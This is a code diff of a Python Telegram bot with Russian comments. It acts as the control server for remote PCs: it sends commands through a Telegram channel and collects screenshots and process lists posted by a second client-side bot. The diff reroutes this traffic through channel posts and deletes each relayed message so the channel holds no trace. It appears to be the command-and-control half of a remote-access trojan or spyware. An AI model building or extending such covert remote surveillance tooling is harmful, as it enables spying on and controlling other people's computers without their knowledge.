@@ -6,10 +6,10 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedIn
 from dotenv import load_dotenv
 
 load_dotenv()
-TOKEN = os.getenv("BOT_TOKEN") # Сюда токен БОТА №1 (Сервер)
+TOKEN = os.getenv("BOT_TOKEN") # Токен БОТА №1 (Сервер)
 ADMIN_ID = 5153650495  # Твой ID
 
-# ЮЗЕРНЕЙМ ТВОЕГО КАНАЛА БЕЗ @
+# ЮЗЕРНЕЙМ ТВОЕГО КАНАЛА БЕЗ СИМВОЛА @
 CHANNEL_USERNAME = "hurghgruuruhgrughuhgur47846776v7" 
 
 bot = Bot(token=TOKEN)
@@ -23,13 +23,13 @@ def is_admin(user_id: int) -> bool:
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     if not is_admin(message.from_user.id): return
-    await message.answer("🤖 Пульт управления (Два бота) готов.\n\n/devices — Список устройств")
+    await message.answer("🤖 Пульт управления (Два бота через канал) готов.\n\n/devices — Список устройств")
 
 @dp.message(Command("devices"))
 async def cmd_devices(message: types.Message):
     if not is_admin(message.from_user.id): return
     if not connected_pcs:
-        await message.answer("❌ Список устройств пуст. Запустите клиент на ПК.")
+        await message.answer("❌ Список устройств пуст. Ожидайте сигнал от клиента.")
         return
     keyboard = [[InlineKeyboardButton(text=f"💻 {info['name']}", callback_data=f"manage_{dev_id}")] for dev_id, info in connected_pcs.items()]
     await message.answer("🎛 Выберите устройство:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
@@ -51,7 +51,7 @@ async def manage_device(callback: types.CallbackQuery):
 async def send_command(callback: types.CallbackQuery):
     _, cmd_type, device_id = callback.data.split("_", 2)
     try:
-        # Бот №1 публикует команду в канал в текстовом виде
+        # Бот №1 публикует команду в канал для клиента
         await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{cmd_type}")
         await callback.answer("🚀 Команда отправлена в канал!")
     except:
@@ -62,38 +62,43 @@ async def back_to_list(callback: types.CallbackQuery):
     await callback.message.delete()
     await cmd_devices(callback.message)
 
-# --- Прием отчетов от ВТОРОГО БОТА (он шлет их напрямую тебе в личку) ---
 
-@dp.message(F.text.startswith("PING:"))
-async def handle_ping(message: types.Message):
+# --- БОТ №1 СЧИТЫВАЕТ ДАННЫЕ ИЗ КАНАЛА, КОТОРЫЕ КИДАЕТ БОТ №2 ---
+
+@dp.channel_post(F.text.startswith("PING:"))
+async def handle_channel_ping(message: types.Message):
+    """Ловим пинг от БОТА №2 из канала"""
     try:
         _, device_id, pc_name = message.text.split(":")
         if device_id not in connected_pcs:
             connected_pcs[device_id] = {"name": pc_name}
-            await bot.send_message(chat_id=ADMIN_ID, text=f"🔔 **ПК `{pc_name}` теперь онлайн!**", parse_mode="Markdown")
-        await message.delete()
+            # Оповещаем тебя в личку о новом устройстве
+            await bot.send_message(chat_id=ADMIN_ID, text=f"🔔 **ПК `{pc_name}` обнаружен онлайн через канал!**", parse_mode="Markdown")
+        await message.delete()  # Удаляем техническое сообщение, чтобы очистить канал
     except: pass
 
-@dp.message(F.document & F.caption.startswith("SCREEN_REPLY:"))
-async def receive_screenshot(message: types.Message):
+@dp.channel_post(F.document & F.caption.startswith("SCREEN_REPLY:"))
+async def receive_channel_screenshot(message: types.Message):
+    """Ловим скриншот от БОТА №2 из канала и пересылаем тебе в личку"""
     try:
         device_id = message.caption.split(":")[1]
         pc_name = connected_pcs.get(device_id, {}).get("name", "Неизвестный ПК")
         file_buffer = await bot.download_file((await bot.get_file(message.document.file_id)).file_path)
         await bot.send_photo(chat_id=ADMIN_ID, photo=BufferedInputFile(file_buffer.read(), filename="s.png"), caption=f"📸 Скриншот: *{pc_name}*", parse_mode="Markdown")
-        await message.delete()
+        await message.delete()  # Удаляем из канала
     except: pass
 
-@dp.message(F.text.startswith("LOG_REPLY:"))
-async def receive_log_reply(message: types.Message):
+@dp.channel_post(F.text.startswith("LOG_REPLY:"))
+async def receive_channel_log(message: types.Message):
+    """Ловим список процессов от БОТА №2 из канала и пересылаем тебе в личку"""
     try:
         text_data = message.text.replace("LOG_REPLY:", "")
         await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown")
-        await message.delete()
+        await message.delete()  # Удаляем из канала
     except: pass
 
 async def main():
-    print("[СЕРВЕР] Бот №1 (Управление) запущен на хостинге!")
+    print("[СЕРВЕР] Бот №1 запущен и слушает канал!")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
